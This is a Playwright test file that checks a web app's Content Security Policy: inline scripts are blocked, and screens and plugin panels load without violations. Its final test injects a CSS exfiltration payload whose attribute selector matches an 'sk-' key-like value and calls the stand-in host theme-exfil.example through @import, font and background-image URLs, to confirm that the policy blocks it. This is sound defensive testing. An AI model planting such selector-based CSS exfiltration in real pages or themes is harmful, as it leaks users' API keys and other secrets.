import { expect, test, type Page } from "@playwright/test";
import { PAGE_CSP } from "../../apps/web/src/lib/page-csp.js";
import { createRecoveryFixture } from "./execution-recovery-fixtures.js";
import { ONBOARDING_VERSION, seedBrowserSettings } from "./helpers/player.js";
import { watchPolicyViolations } from "./helpers/page-policy.js";

// The built app is under its production page policy. A screen
// that needs an inline script, a remote script or a frame from elsewhere
// reports a violation here instead of failing silently for players.

async function expectPagePolicy(page: Page) {
  expect(
    await page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute("content"),
  ).toBe(PAGE_CSP);
}

async function seed(page: Page) {
  await seedBrowserSettings(page, {
    "ui.onboardedVersion": ONBOARDING_VERSION,
    "ui.locale": "en-US",
  });
}

async function open(page: Page, path: string) {
  await page.goto(path);
  await page.waitForLoadState("load");
  await expect(page.locator("#root")).not.toBeEmpty();
}

test("the watcher reports a violation of the page policy", async ({ page }) => {
  const violations = await watchPolicyViolations(page);
  await seed(page);
  await open(page, "/");
  await expectPagePolicy(page);
  await page.evaluate(() => {
    const script = document.createElement("script");
    script.textContent = "window.inlineScriptRan = true";
    document.head.append(script);
  });
  await expect.poll(() => violations.length).toBeGreaterThan(0);
  expect(violations.join("\n")).toContain("script-src");
  expect(
    await page.evaluate(
      () =>
        (window as unknown as { inlineScriptRan?: boolean }).inlineScriptRan,
    ),
  ).toBeUndefined();
});

test("main screens load without a policy violation", async ({ page }) => {
  const violations = await watchPolicyViolations(page);
  await page.setViewportSize({ width: 1280, height: 900 });
  await seed(page);

  await open(page, "/");
  await expectPagePolicy(page);

  await open(page, "/session");
  await page
    .getByRole("button", { name: /Configure Providers & Models/ })
    .click();
  const settings = page.getByRole("dialog");
  await expect(settings).toBeVisible();
  await settings
    .getByRole("button", { name: "Generation", exact: true })
    .click();

  await open(page, "/debug");

  expect(violations).toEqual([]);
});

test("a session with plugin panels runs without a policy violation", async ({
  page,
}) => {
  const violations = await watchPolicyViolations(page);
  await page.setViewportSize({ width: 1440, height: 900 });
  const fixture = await createRecoveryFixture(page, "completed");
  try {
    await open(page, `/session?sid=${fixture.id}`);
    await expectPagePolicy(page);
    const tabs = page.getByRole("tab");
    await expect(tabs.first()).toBeVisible();
    // Every panel the session's plugins contribute, one after the other.
    const count = await tabs.count();
    for (let index = 0; index < count; index += 1) {
      const tab = tabs.nth(index);
      if (!(await tab.isVisible())) continue;
      await tab.click();
    }
    expect(violations).toEqual([]);
  } finally {
    await fixture.dispose();
  }
});

test("theme CSS cannot send selector matches to remote image or font hosts (F-009)", async ({
  page,
}) => {
  const violations = await watchPolicyViolations(page);
  await seed(page);
  await open(page, "/");
  let requests = 0;
  await page.route("https://theme-exfil.example/**", async (route) => {
    requests += 1;
    await route.abort();
  });
  await page.evaluate(() => {
    // Deliberately expose a synthetic match to exercise the second boundary,
    // independently of the secret input's protection.
    const probe = document.createElement("div");
    probe.id = "theme-security-probe";
    probe.setAttribute("data-probe", "sk-synthetic");
    probe.textContent = "probe";
    document.body.append(probe);
    const style = document.createElement("style");
    style.textContent = `
      @import url("https://theme-exfil.example/style");
      @font-face { font-family: Exfil; src: url("https://theme-exfil.example/font"); }
      #theme-security-probe[data-probe^="sk-"] {
        background-image: url("https://theme-exfil.example/image");
        font-family: Exfil;
      }
    `;
    document.head.append(style);
  });
  await expect.poll(() => violations.join("\n")).toContain("img-src");
  await expect.poll(() => violations.join("\n")).toContain("font-src");
  await expect.poll(() => violations.join("\n")).toContain("style-src");
  expect(requests).toBe(0);
});
